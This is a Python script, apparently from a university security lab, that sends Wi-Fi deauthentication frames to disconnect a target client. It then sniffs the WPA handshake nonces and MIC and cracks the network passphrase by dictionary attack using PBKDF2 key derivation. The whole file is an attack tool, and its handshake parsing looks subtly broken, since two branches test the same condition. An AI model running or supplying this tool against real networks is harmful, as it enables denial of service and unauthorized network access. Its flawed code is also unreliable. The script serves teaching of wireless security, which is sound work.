#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Scairodump
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"
__modified_by__ = "Blanc Jean-Luc & Plancherel Noémie"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
import argparse

def deauth(Clientmac, APmac, iface):
    dot11 = Dot11(addr1=Clientmac, addr2=APmac, addr3=APmac)
   
    # prepare the packet
    packet = RadioTap()/dot11/Dot11Deauth(reason=4)
    
    # send the packet with all parameters
    sendp(packet, inter=0.1, count=30, loop=0, iface=iface, verbose=1)
    
def wpa_sniff(packet):
    global mic_to_test, SNonce, ANonce
    
    # Get Authenticator Nonce
    # We are looking for Authentication request in the first key exchange
    if packet.type == 0x2 and packet.subtype == 0x0:
       ANonce = packet.load[13:45]
       print(ANonce)

    # Get Supplicant Nonce and MIC
    # Get the SNonce based on the MAC address
    elif packet.type == 0x2 and packet.subtype == 0x8:
        SNonce = packet.load[13:45]
        print(SNonce)

    # Get MIC
    elif packet.subtype == 0x8 and packet.type == 0x2:
        mic_to_test = Dot11Elt(packet).load[129:-2].hex()
        print(mic_to_test)
    

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# add all arguments to parser
parser = argparse.ArgumentParser(description="A python script to crack passphrase and deauthenticate client")
parser.add_argument('interface', action="store", help="Specify a monitoring interface (ex. mon0)") 
parser.add_argument("target", help="Target MAC address to deauthenticate.")
parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
parser.add_argument("ssid", help="SSID you want to attack")
parser.add_argument("-d" , dest="deauth_bool", help="Specify if you want to deauthenticate after cracking passphrase", action="store_true")

args = parser.parse_args()
iface = args.interface
deauth_bool = args.deauth_bool
target = args.target
ap = args.gateway
ssid = args.ssid

if deauth_bool :
    deauth(target, ap, iface)

# Sniffing network on interface
wpa = sniff(prn=wpa_sniff, iface=iface, count=50)

# Name of network we want to attack
APmac      = a2b_hex(ap.replace(':', ''))
Clientmac      = a2b_hex(target.replace(':', ''))
    
ssid = str.encode(ssid)

# Open wordlist
passphrases =  open("wordlist.txt", 'r')
# Read every word in worlist 
for passphrase in passphrases:
    
    A    = "Pairwise key expansion"
    B    = min(APmac, Clientmac)+max(APmac, Clientmac)+min(ANonce, SNonce)+max(ANonce, SNonce)
    data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
    
    passphrase = passphrase.replace("\n", "")
    passphrase = str.encode(passphrase)
    pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)
    ptk = customPRF512(pmk,str.encode(A),B)
    
    mic_passphrase = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]

    if(mic_passphrase == mic_to_test):
        print("********************************")
        print("PASSPHRASE FOUND : ", passphrase.decode())
        print("********************************")
        exit(0)
    
    print("PASSPHRASE INCORRECT : ", passphrase.decode())

print("NO PASSPHRASE FOUND !")
exit(1)
